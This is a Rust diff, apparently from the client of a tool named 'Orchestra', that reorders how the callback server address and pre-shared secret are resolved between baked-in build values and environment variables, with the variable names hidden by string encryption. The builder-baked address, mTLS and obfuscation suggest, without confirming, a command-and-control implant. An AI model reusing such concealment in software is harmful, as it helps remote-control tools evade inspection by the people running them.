@@ -7,15 +7,17 @@
 //! # Address resolution
 //!
 //! Release builds use `ORCHESTRA_C_ADDR` baked into the binary at compile time
-//! via the Builder's `cargo build … ORCHESTRA_C_ADDR=<addr>` invocation. Debug
-//! builds may override it with the `ORCHESTRA_C` runtime environment variable
-//! to simplify local testing.
+//! via the Builder's `cargo build … ORCHESTRA_C_ADDR=<addr>` invocation and
+//! prioritize that value, but fall back to the `ORCHESTRA_C` runtime
+//! environment variable if the baked constant is absent. Debug builds instead
+//! prioritize the runtime environment variable to simplify local testing.
 //!
 //! # Secret resolution
 //!
-//! Release builds use `ORCHESTRA_C_SECRET` baked in at compile time. Debug
-//! builds may override it with the `ORCHESTRA_SECRET` runtime environment
-//! variable for local testing.
+//! Release builds use `ORCHESTRA_C_SECRET` baked in at compile time and
+//! prioritize it, but fall back to the `ORCHESTRA_SECRET` runtime environment
+//! variable if the baked constant is absent. Debug builds instead prioritize
+//! the runtime environment variable for local testing.
 //!
 //! # TLS verification
 //!
@@ -59,32 +61,46 @@ const BAKED_MTLS_KEY: Option<&str> = option_env!("ORCHESTRA_C_MTLS_KEY");
 
 const MAX_BACKOFF_SECS: u64 = 64;
 
-/// Resolve the server address: runtime env var beats compile-time constant.
+/// Resolve the server address.
+///
+/// Debug builds: runtime env var takes precedence over baked constant.
+/// Release builds: baked constant takes precedence, env var is fallback.
 pub fn resolve_addr() -> Option<String> {
-    {
+    // Always try the encrypted env var key first.
+    let env_val = {
         let raw = string_crypt::enc_str!("ORCHESTRA_C");
         let key = std::str::from_utf8(&raw)
             .unwrap_or("")
             .trim_end_matches('\0');
-        if let Ok(v) = std::env::var(key) {
-            return Some(v);
-        }
+        std::env::var(key).ok()
+    };
+
+    if cfg!(debug_assertions) {
+        env_val.or_else(|| BAKED_ADDR.map(str::to_string))
+    } else {
+        BAKED_ADDR.map(str::to_string).or(env_val)
     }
-    BAKED_ADDR.map(str::to_string)
 }
 
-/// Resolve the pre-shared secret: runtime env var beats compile-time constant.
+/// Resolve the pre-shared secret.
+///
+/// Debug builds: runtime env var takes precedence over baked constant.
+/// Release builds: baked constant takes precedence, env var is fallback.
 pub fn resolve_secret() -> Option<String> {
-    {
+    // Always try the encrypted env var key first.
+    let env_val = {
         let raw = string_crypt::enc_str!("ORCHESTRA_SECRET");
         let key = std::str::from_utf8(&raw)
             .unwrap_or("")
             .trim_end_matches('\0');
-        if let Ok(v) = std::env::var(key) {
-            return Some(v);
-        }
+        std::env::var(key).ok()
+    };
+
+    if cfg!(debug_assertions) {
+        env_val.or_else(|| BAKED_SECRET.map(str::to_string))
+    } else {
+        BAKED_SECRET.map(str::to_string).or(env_val)
     }
-    BAKED_SECRET.map(str::to_string)
 }
 
 /// Resolve the TLS certificate fingerprint (hex SHA-256).
